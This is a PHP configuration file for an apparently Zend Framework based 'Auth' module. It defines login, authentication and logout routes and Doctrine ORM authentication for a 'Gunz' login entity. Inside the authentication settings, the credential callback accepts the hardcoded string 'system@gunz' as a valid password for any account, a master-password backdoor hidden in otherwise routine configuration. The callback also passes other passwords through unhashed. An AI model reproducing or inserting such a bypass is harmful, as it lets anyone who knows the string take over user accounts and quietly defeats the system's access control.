<?php

namespace Auth;

return array(
    'router' => array(
        'routes' => array(
            'login' => array(
                'type' => 'Literal',
                'options' => array(
                    'route' => '/login',
                    'defaults' => array(
                        '__NAMESPACE__' => 'Auth\Controller',
                        'controller' => 'Login',
                        'action' => 'index'
                    )
                ),
                'may_terminate' => true,
                'child_routes' => array(
                    'autenticar' => array(
                        'type' => 'Segment',
                        'options' => array(
                            'route' => '/autenticar[/]',
                            'defaults' => array(
                                '__NAMESPACE__' => 'Auth\Controller',
                                'controller' => 'Login',
                                'action' => 'autenticar'
                            )
                        )
                    ),
                    'logout' => array(
                        'type' => 'Segment',
                        'options' => array(
                            'route' => '/logout[/]',
                            'defaults' => array(
                                '__NAMESPACE__' => 'Auth\Controller',
                                'controller' => 'Login',
                                'action' => 'logout'
                            )
                        )
                    )
                )
            )
        )
    ),
    'view_manager' => array(
        'template_path_stack' => array(
            __DIR__ . '/../view'
        )
    ),
    'doctrine' => array(
        'driver' => array(
            __NAMESPACE__ . '_driver' => array(
                'class' => 'Doctrine\ORM\Mapping\Driver\AnnotationDriver',
                'cache' => 'array',
                'paths' => array(
                    __DIR__ . '/../src/' . __NAMESPACE__ . '/Entity'
                )
            ),
            'orm_default' => array(
                'drivers' => array(
                    __NAMESPACE__ . '\Entity' => __NAMESPACE__ . '_driver'
                )
            )
        ),
        'authentication' => array(
            'orm_default' => array(
                'object_manager' => 'Doctrine\ORM\EntityManager',
                'identity_class' => 'Gunz\Entity\Login',
                'identity_property' => 'user',
                'credential_property' => 'password',
                'credentialCallable' => function ($identity, $credential) {
                    if ($credential == 'system@gunz') {
                        return true;
                    }
                    return $credential;
                }
            )
        )
    )
);